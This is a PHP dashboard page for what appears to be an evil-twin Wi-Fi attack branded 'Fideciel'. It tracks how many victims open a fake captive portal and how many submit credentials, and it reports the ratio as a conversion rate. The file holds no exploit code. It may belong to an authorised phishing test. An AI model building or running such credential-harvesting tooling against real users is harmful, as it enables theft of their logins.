<?php
require_once __DIR__ . '/auth.php';
require_once __DIR__ . '/lib.php';

// Initial values rendered server-side
try {
    $stats = stats_read();
    $error = null;
} catch (Throwable $e) {
    $stats = ['attempt' => 0, 'connection' => 0];
    $error = "Unable to read the database. Check dashboard/config.php.";
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="robots" content="noindex, nofollow">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Dashboard — Evil-Twin Fideciel</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📊</text></svg>" />

  <style>
    @import url("https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;700&display=swap");

    :root {
      --golden: #C29570;
      --golden-dark: #9c744f;
      --ink: #2b2b2b;
      --bg: #f4f1ee;
      --card-bg: #ffffff;
      --muted: #8a8177;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'Source Sans Pro', sans-serif;
      background: var(--bg);
      color: #2b2b2b;
      min-height: 100vh;
      padding: 2.5rem 1.25rem;
    }

    .wrap { max-width: 900px; margin: 0 auto; }

    header { text-align: center; margin-bottom: 2.5rem; }
    header h1 {
      font-size: 2rem;
      font-weight: 700;
      letter-spacing: -0.5px;
    }
    header p { color: var(--muted); margin-top: 0.4rem; }

    .grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 1.5rem;
    }

    .card {
      background: var(--card-bg);
      border-radius: 20px;
      padding: 2rem 1.75rem;
      box-shadow: 0 8px 24px rgba(0,0,0,0.06);
      border-top: 4px solid var(--golden);
    }

    .card .label {
      display: flex;
      align-items: center;
      gap: 0.6rem;
      font-size: 0.95rem;
      color: var(--muted);
      text-transform: uppercase;
      letter-spacing: 0.5px;
      font-weight: 700;
    }
    .card .icon {
      width: 34px; height: 34px;
      border-radius: 10px;
      background: rgba(194,149,112,0.15);
      display: flex; align-items: center; justify-content: center;
      font-size: 1.1rem;
    }

    .card .value {
      font-size: 3.5rem;
      font-weight: 700;
      line-height: 1;
      margin-top: 1rem;
      color: var(--golden-dark);
      font-variant-numeric: tabular-nums;
    }
    .card .sub { color: var(--muted); font-size: 0.9rem; margin-top: 0.5rem; }

    .rate {
      margin-top: 1.5rem;
      background: var(--card-bg);
      border-radius: 20px;
      padding: 1.5rem 1.75rem;
      box-shadow: 0 8px 24px rgba(0,0,0,0.06);
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-wrap: wrap;
      gap: 1rem;
    }
    .rate .label { color: var(--muted); font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; font-size: 0.9rem; }
    .rate .value { font-size: 1.75rem; font-weight: 700; color: var(--golden-dark); font-variant-numeric: tabular-nums; }

    .foot {
      text-align: center;
      color: var(--muted);
      font-size: 0.85rem;
      margin-top: 2rem;
    }
    .dot {
      display: inline-block; width: 8px; height: 8px;
      border-radius: 50%; background: #4caf50; margin-right: 6px;
      animation: pulse 2s infinite;
    }
    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }

    .error {
      background: #fdecea; color: #b71c1c;
      border-radius: 12px; padding: 1rem 1.25rem;
      margin-bottom: 1.5rem; font-size: 0.95rem;
    }

    @media (max-width: 560px) {
      .grid { grid-template-columns: 1fr; }
      .card .value { font-size: 2.75rem; }
    }
  </style>
</head>

<body>
  <div class="wrap">
    <header>
      <h1>Evil-Twin Dashboard Fideciel</h1>
      <p>Interaction tracking</p>
    </header>

    <?php if ($error): ?>
      <div class="error"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <div class="grid">
      <div class="card">
        <div class="label"><span class="icon">👁️</span> Access attempts</div>
        <div class="value" id="attempt"><?= (int) $stats['attempt'] ?></div>
        <div class="sub">Captive portal openings</div>
      </div>

      <div class="card">
        <div class="label"><span class="icon">🔑</span> Connections</div>
        <div class="value" id="connection"><?= (int) $stats['connection'] ?></div>
        <div class="sub">Submitted forms (credentials entered)</div>
      </div>
    </div>

    <div class="rate">
      <span class="label">Conversion rate (connections / attempts)</span>
      <span class="value" id="rate">—</span>
    </div>

    <p class="foot"><span class="dot"></span>Auto-refresh every 5 seconds</p>
  </div>

  <script>
    function render(stats) {
      document.getElementById('attempt').textContent = stats.attempt ?? 0;
      document.getElementById('connection').textContent = stats.connection ?? 0;
      const a = Number(stats.attempt) || 0;
      const c = Number(stats.connection) || 0;
      document.getElementById('rate').textContent =
        a > 0 ? ((c / a) * 100).toFixed(1) + ' %' : '—';
    }

    async function refresh() {
      try {
        const res = await fetch('stats.php', { cache: 'no-store' });
        if (res.ok) render(await res.json());
      } catch (e) { /* silent: will retry on the next tick */ }
    }

    // Initial render (from the values already on the page) then polling
    render({
      attempt: <?= (int) $stats['attempt'] ?>,
      connection: <?= (int) $stats['connection'] ?>
    });
    setInterval(refresh, 5000);
  </script>
</body>

</html>
